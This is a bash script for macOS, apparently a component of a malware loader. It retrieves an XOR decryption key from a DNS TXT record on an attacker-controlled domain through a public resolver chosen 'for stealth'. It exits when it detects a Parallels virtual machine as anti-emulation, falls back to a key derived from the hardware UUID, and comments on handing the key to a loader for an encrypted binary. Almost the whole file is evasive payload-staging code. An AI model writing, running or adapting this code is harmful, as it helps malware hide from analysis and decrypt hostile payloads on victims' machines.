#!/bin/bash

# Fetch XOR key from DNS TXT record for a subdomain
DOMAIN="key.crimsoncore.be"  # Replace with your controlled subdomain

# Check for virtualized environment (basic anti-emulation)
if [ -d "/Library/Preferences/Parallels" ]; then
    echo "Virtualized environment detected. Exiting."
    exit 1
fi

# Perform DNS TXT query with dig, using a public resolver for stealth
XOR_KEY=$(dig @8.8.8.8 +short TXT "$DOMAIN" 2>/dev/null | tr -d '"')

# Check if key was retrieved
if [ -z "$XOR_KEY" ]; then
    echo "Error: Failed to retrieve XOR key from $DOMAIN"
    # Fallback: Derive key from system UUID (example)
    XOR_KEY=$(system_profiler SPHardwareDataType | grep UUID | awk '{print $3}' | md5)
    if [ -z "$XOR_KEY" ]; then
        echo "Fallback failed. Exiting."
        exit 1
    fi
    echo "Using fallback key: $XOR_KEY"
fi

# Print key for demonstration (avoid in production)
echo "Retrieved XOR key: $XOR_KEY"

# Placeholder for using the key (e.g., pass to a loader)
# Example: ./loader --key "$XOR_KEY" encrypted_binary.bin

# Clean up sensitive data
unset XOR_KEY
echo "XOR key cleared from memory."

exit 0
